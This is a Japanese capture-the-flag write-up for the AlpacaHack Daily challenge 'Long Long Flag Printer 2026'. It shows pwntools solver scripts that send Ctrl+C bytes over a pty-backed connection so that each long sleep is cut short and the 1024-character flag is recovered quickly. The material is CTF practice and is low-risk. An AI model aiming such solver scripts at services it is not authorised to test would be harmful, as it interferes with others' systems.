---
title: "Long Long Flag Printer 2026 - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "pwntools", "os-system", "long", "printer"]
summary: "pwn writeup for \"Long Long Flag Printer 2026\" from AlpacaHack Daily - techniques: alpacahack, pwntools, os-system, long, printer."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d03-04_Long_Long_Flag_Printer_2026/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Long Long Flag Printer 2026"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Long Long Flag Printer 2026
- **Date:** 2026-08-03-04
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d03-04_Long_Long_Flag_Printer_2026>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d03-04_Long_Long_Flag_Printer_2026/README.md>

---
# Long Long Flag Printer 2026

## 問題

おかげさまで Long Flag Printer 2026 のフラグがさらに長くなりました

```py
import os

flag = "Alpaca{***(略)*** REDACTED ***(略)***}"
assert len(flag) == 1024

for i, c in enumerate(flag):
    print(c, end="", flush=True)
    os.system(f"sleep {i}")
```

## 概要

え？またフラグが長くなったんですか？

このあいだB-Sideで16文字から31文字に増えてかなり苦戦したばかりなのにですか？

今度は何文字ですか？40文字とか50文字とかですか？前回もギリギリだったのにもう無理ですよ？

え？1024文字！？絶対無理ですよ。どうすればいいんですか？

## 解法

※注意：この解法には3月4日の過去問「Flag Printer 2026」や7月17～21日のB-Side「Long Flag Printer 2026」のネタバレが含まれます。

今回のDockerfileを見てみると、これまでのものと比べて
```
,stderr,pty,ctty,setsid,echo=0
```
というオプションがつけられており、ダミー送信を70〜80回程度したところで落ちてしまう問題については解消されているようです。

それであれば、回数を気にせず4.8秒ごとにダミーデータを送り続ければいいと考えました。

```py
from pwn import *
import time

HOST, PORT = "localhost", 1337
p = remote(HOST, PORT)

flag = b""
cnt = 0
while len(flag) < 1024:
    p.sendline(b"a")
    cnt += 1
    print(f"{cnt = }")
    time.sleep(4.8)

    d = p.recv(timeout=0.1)
    if d:
        flag += d
        print(f"{d = }")

print(f"{flag = }")
```

これを実行してみると、実際フラグの最初の部分は順調に取得できる様子が確認できました。

しかしここで、この問題にはもっと別の罠が隠れていることに気が付きました。

実行しながら思ったのですが、これ、いったいいつになったら終わるのでしょうか？

今回、Dailyでは初の2日間にわたる出題で、出題期間は24時間ではなく48時間です。

最初は、ああ、だから時間がかかる問題が出されたのかな、くらいにのん気に考えていましたが、考えが甘かったようです。

素直にフラグが全部出るのを待つと、1+2+...+1022 = (1+1022)×1022÷2 = 523264より、523264秒 = 145.35時間かかってしまいます。

これでは出題期間中の提出ができません。何か違う方法があるのでしょうか？

そういえば、今までの類題では
```py
    time.sleep(i)
```
のようにPythonのsleep関数を使っているのに対して、今回は、
```py
    os.system(f"sleep {i}")
```
のようにわざわざsystem関数でlinuxのsleepコマンドを呼び出しています。

この違いに何か意味があるのではないでしょうか？

調べてみると、sleepコマンドはCtrl+Cで強制終了できることがわかりました。

したがって、sleep状態に入るたびにすぐにCtrl+Cを打ち込めば、sleepがキャンセルされて比較的短時間でフラグを全回収できるでしょう。

ただし、ターミナルからCtrl+Cを送ってはダメです。実行そのものが終わってしまいます。

よって、pwntoolsからCtrl+Cの情報を送る必要がありますが、.sendで送るときはb"\x03"がこれに該当します。

```py
from pwn import *

HOST, PORT = "localhost", 1337
# HOST, PORT = "34.170.146.252", 21066
p = remote(HOST, PORT)

flag = b""
while len(flag) < 1024:
    d = p.recv(timeout=0.1)
    print(f"{d = }")
    flag += d
    time.sleep(0.1)
    p.send(b"\x03")

print(flag)
```
